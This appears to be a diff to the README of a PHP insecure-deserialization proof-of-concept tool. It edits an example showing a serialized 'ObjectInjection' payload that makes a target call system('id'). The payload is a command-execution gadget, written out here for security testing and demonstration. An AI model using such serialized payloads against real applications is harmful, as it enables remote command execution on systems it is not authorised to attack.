@@ -11,7 +11,7 @@ Now you can easily do the PoC of insecure deserialization without worrying about
 ## Payload Example
 ```php
 echo serialize(new ObjectInjection("system","id"));
-// O:15:"ObjectInjection":2:{s:20:"ObjectInjectioncmd";s:2:"id";s:20:"ObjectInjectionfcn";s:6:"system";}
+// O:2:"OI":2:{s:3:"fcn";s:6:"system";s:3:"cmd";s:2:"id";}
 ```
 ## References
 - https://www.php.net/manual/en/language.oop5.magic.php
